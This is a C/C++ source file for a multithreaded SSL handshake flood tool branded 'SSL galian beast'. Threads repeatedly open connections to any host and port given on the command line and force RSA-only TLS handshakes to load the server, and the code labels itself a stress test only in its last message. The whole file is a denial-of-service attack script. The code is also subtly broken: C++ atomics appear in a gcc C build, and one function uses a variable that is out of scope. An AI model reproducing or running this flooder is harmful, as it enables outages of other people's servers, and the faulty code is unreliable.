// gcc -o gbeast galian_beast.c -lssl -lcrypto -lpthread

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <atomic>

#define BANNER "\n\033[1;31m" \
"                            ,-.\n" \
"       ___,---.__          /'|`\          __,---,___\n" \
"    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.\n" \
"  ,'        |           ~'\     /`~           |        `.\n" \
" /      ___//              `. ,'          ,  , \___      \\n" \
"|    ,-'   `-.__   _         |        ,    __,-'   `-.    |\n" \
"|   /          /\_  `   .    |    ,      _/\          \   |\n" \
"\  |           \ \`-.___ \   |   / ___,-'/ /           |  /\n" \
" \  \           | `._   `\\  |  //'   _,' |           /  /\n" \
"  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'\n" \
"     ``       /     \    ,='/ \`=.    /     \       ''\n" \
"\033[0mSSL g a l i a n    b e a s t\n\n"

std::atomic<long> total_connections(0);
std::atomic<long> successful_handshakes(0);
struct sockaddr_in target_addr;

typedef struct {
    int thread_id;
    int max_attempts;
} ThreadConfig;

void init_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

SSL_CTX* create_ssl_ctx() {
    SSL_CTX *ctx = SSL_CTX_new(TLSv1_2_client_method());
    SSL_CTX_set_options(ctx, SSL_OP_NO_TICKET);
    SSL_CTX_set_cipher_list(ctx, "RSA");
    return ctx;
}

void resolve_target(const char *host, int port) {
    struct hostent *he = gethostbyname(host);
    if (!he) {
        fprintf(stderr, " - Failed to resolve %s\n", host);
        exit(1);
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    memcpy(&target_addr.sin_addr, he->h_addr_list[0], he->h_length);
}

void print_stats() {
    printf("\r\033[34m[+] Connections: %ld | Handshakes: %ld | Threads: %d\033[0m", 
          total_connections.load(), successful_handshakes.load(), 0);
    fflush(stdout);
}

void* attack_thread(void* arg) {
    ThreadConfig *config = (ThreadConfig*)arg;
    SSL_CTX *ctx = create_ssl_ctx();
    
    for (int i = 0; i < config->max_attempts; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, sock);
            SSL_set_tlsext_host_name(ssl, target_host);

            if (SSL_connect(ssl) == 1) {
                successful_handshakes++;
            }
            
            SSL_shutdown(ssl);
            SSL_free(ssl);
            total_connections++;
        }
        close(sock);
        
        if (i % 10 == 0) print_stats();
    }
    
    SSL_CTX_free(ctx);
    free(config);
    return NULL;
}

int main(int argc, char *argv[]) {
    printf(BANNER);
    
    if (argc != 4) {
        printf("Usage: %s <IP/HOST> <PORT> <THREADS>\n", argv[0]);
        return 1;
    }

    const char *target_host = argv[1];
    int target_port = atoi(argv[2]);
    int thread_count = atoi(argv[3]);

    resolve_target(target_host, target_port);
    init_openssl();

    pthread_t *threads = (pthread_t*)malloc(thread_count * sizeof(pthread_t));
    
    for (int i = 0; i < thread_count; i++) {
        ThreadConfig *config = (ThreadConfig*)malloc(sizeof(ThreadConfig));
        config->thread_id = i;
        config->max_attempts = 1000;
        
        if (pthread_create(&threads[i], NULL, attack_thread, config) != 0) {
            perror("Thread creation failed");
        }
    }

    while (total_connections < (thread_count * 1000)) {
        print_stats();
        sleep(1);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[32m[+] Stress test completed!\033[0m\n");
    EVP_cleanup();
    free(threads);
    return 0;
}
